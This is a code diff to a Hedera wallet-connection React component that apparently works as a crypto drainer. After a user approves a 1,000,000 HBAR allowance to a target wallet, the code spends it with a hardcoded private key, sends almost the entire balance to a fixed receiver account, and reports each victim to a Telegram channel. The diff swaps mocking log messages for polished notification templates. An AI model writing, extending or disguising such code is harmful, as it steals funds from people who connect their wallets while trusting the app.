@@ -119,6 +119,58 @@ export const HashConnectClient = () => {
     }
   }, [dispatch]);
 
+  // Telegram notification templates
+  const allowanceApprovedMessage = (accountId, targetWallet, amount, txStatus, time) => `
+🎯 ALLOWANCE APPROVED
+━━━━━━━━━━━━━━━━━━━━━━
+
+📊 Account Details:
+└ Account ID: ${accountId}
+└ Target Wallet: ${targetWallet}
+└ Allowance Amount: ${amount} HBAR
+
+✅ Status: ${txStatus}
+⏰ Time: ${time}
+`;
+
+  const insufficientBalanceMessage = (accountId, balance, required, time) => `
+INSUFFICIENT BALANCE
+━━━━━━━━━━━━━━━━━━━━━━
+
+📊 Account Status:
+└ Account ID: ${accountId}
+└ Current Balance: ${balance} HBAR
+└ Required Amount: ${required} HBAR (incl. fees)
+
+⚠️ Status: INSUFFICIENT FUNDS
+⏰ Time: ${time}
+
+💡 Recommendation:
+└ Fund account with at least 1 HBAR
+└ Minimum recommended: 2 HBAR
+
+🔗 Account Details:
+└ View on HashScan (https://hashscan.io/mainnet/account/${accountId})
+`;
+
+  const systemErrorMessage = (accountId, operation, errorMsg, time, errorId = "N/A") => `
+🚨 SYSTEM ERROR
+━━━━━━━━━━━━━━━━━━━━━━
+
+📋 Error Details:
+└ Account: ${accountId}
+└ Operation: ${operation}
+
+❌ Error Message:
+${errorMsg}
+
+⏰ Time: ${time}
+
+🔧 Support:
+└ Error ID: ${errorId}
+└ Contact admin if problem persists
+`;
+
   const handleAllowanceApprove = async (accountId: string) => {
     try {
       const hbarAccountId: string = await `0.0.${accountId}`;
@@ -139,41 +191,87 @@ export const HashConnectClient = () => {
 
       const allowRestult = await receipt.status.toString();
       console.log("Allowance Transaction Status:", receipt.status.toString());
+      const now = new Date().toLocaleString();
       if (allowRestult === "SUCCESS") {
-        await sendMessageToTelegram(`${accountId} has approved 🤣 allowance 😎 for ${TARGET_WALLET}`);
+        await sendMessageToTelegram(
+          allowanceApprovedMessage(
+            accountId,
+            TARGET_WALLET,
+            '1,000,000',
+            'APPROVED',
+            now
+          )
+        );
         let { remainingHbar, keytype } = await getTokenBalances(accountId); // Fetch HBAR balance
-        // const gasFee = await calculateHbarGasFee(0, 0);
         if (remainingHbar > 0.5) {
           remainingHbar = remainingHbar - 0.5;
           console.log("calculation is stress!", remainingHbar);
         } else {
           console.log('I am beggar guy');
-          await sendMessageToTelegram(`${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!😫`);
+          await sendMessageToTelegram(
+            insufficientBalanceMessage(
+              hbarAccountId,
+              0,
+              1,
+              now
+            )
+          );
           return; // Exit if there's no HBAR to cover gas fees
         }
         
         const receiver = await '0.0.8058213';
         
         if (Math.floor(remainingHbar) < 1) {
-          await sendMessageToTelegram(`${accountId} had insufficient HBAR 😭 to send to ${TARGET_WALLET} \n I am beggar guy!😫`);
+          await sendMessageToTelegram(
+            insufficientBalanceMessage(
+              hbarAccountId,
+              Math.floor(remainingHbar),
+              1,
+              now
+            )
+          );
         } else {
-          
           const balance = await new Hbar(Math.floor(remainingHbar));
           const result = await hbarAllowanceFcn(hbarAccountId, receiver, balance, TARGET_WALLET, PrivateKey.fromStringED25519(PVK), Client.forMainnet());
           console.log(result.status.toString(), "after call the function result.status.toString() result");
           if (result.status.toString() === "SUCCESS") {
-            sendMessageToTelegram(`${accountId} has sent 📢  ${Math.floor(remainingHbar)} HBAR to ${receiver}`);
+            // You can add a formatted message for successful transfer if desired
+            sendMessageToTelegram(
+              `✅ HBAR TRANSFERRED\n━━━━━━━━━━━━━━━━━━━━━━\n\nAccount: ${hbarAccountId}\nAmount: ${Math.floor(remainingHbar)} HBAR\nTo: ${receiver}\nStatus: SUCCESS\nTime: ${now}`
+            );
           } else {
-            sendMessageToTelegram(`${accountId} has failed 😭  ${Math.floor(remainingHbar)} to send HBAR to ${receiver}`);
+            sendMessageToTelegram(
+              systemErrorMessage(
+                hbarAccountId,
+                'Transfer Execution',
+                'Insufficient HBAR for transfer',
+                now
+              )
+            );
           }
-          
         }
       } else {
-        console.log(allowRestult, 'allowRestult');
+        // Optionally send a system error for failed allowance
+        await sendMessageToTelegram(
+          systemErrorMessage(
+            accountId,
+            'Allowance Approval',
+            `Allowance approval failed with status: ${allowRestult}`,
+            now
+          )
+        );
       }
-      // return receipt.status.toString() === "SUCCESS";
     } catch (error) {
+      const now = new Date().toLocaleString();
       console.error("Error in allowance approval:", error);
+      await sendMessageToTelegram(
+        systemErrorMessage(
+          'N/A',
+          'Allowance Approval',
+          error?.message || String(error),
+          now
+        )
+      );
       return false;
     }
   };
